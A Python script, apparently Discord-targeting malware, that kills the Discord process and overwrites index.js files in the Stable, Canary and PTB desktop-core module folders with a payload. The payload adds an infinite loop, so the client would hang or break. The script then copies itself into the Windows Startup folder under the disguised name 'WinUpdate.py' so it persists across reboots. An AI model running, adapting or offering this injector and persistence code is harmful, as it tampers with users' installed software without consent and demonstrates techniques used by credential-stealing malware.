import os
import subprocess
from pathlib import Path
import sys
import shutil


user = str(os.environ["USERNAME"])
name = sys.argv[0]

payload = """
module.exports = require('./core.asar');
for (var i = 5; i > 3; i = i + 1){ console.log(i); }
"""

def persistance():
    if os.path.isfile("C:\\Users\\" + user + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WinUpdate.py"):
        exit()
    else:
        shutil.copy(__file__, "C:\\Users\\" + user + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WinUpdate.py")

def inject(file):
    name = file.name
    if name == "index.js":
        with open(file, 'r') as file2:
            content = file2.read()
            file2.close()
            if content == payload:
                print("already infected")
                exit()
            else:
                with open(file, 'w') as file3:
                    file3.write(payload)

def main():
    print(sys.argv[0])
    os.system("taskkill /IM discord.exe")
    path1 = "C:\\Users\\" + user + "\\AppData\\Roaming\\discord\\0.0.309\\modules\\discord_desktop_core"
    path2 = "C:\\Users\\" + user +"\\AppData\\Roaming\\discordcanary\\0.0.293\\modules\\discord_desktop_core"
    path3 = "C:\\Users\\" + user + "\\AppData\\Roaming\\discordptb\\0.0.56\\modules\\discord_desktop_core"
    if os.path.isdir(path1):
        my_path = Path(path1)
        for file in my_path.glob("**/*.js"):
            inject(file)
    if os.path.isdir(path2):
        my_path = Path(path2)
        for file in my_path.glob("**/*.js"):
            inject(file)
    if os.path.isdir(path3):
        my_path = Path(path3)
        for file in my_path.glob("**/*.js"):
            inject(file)
    persistance()
    
main()
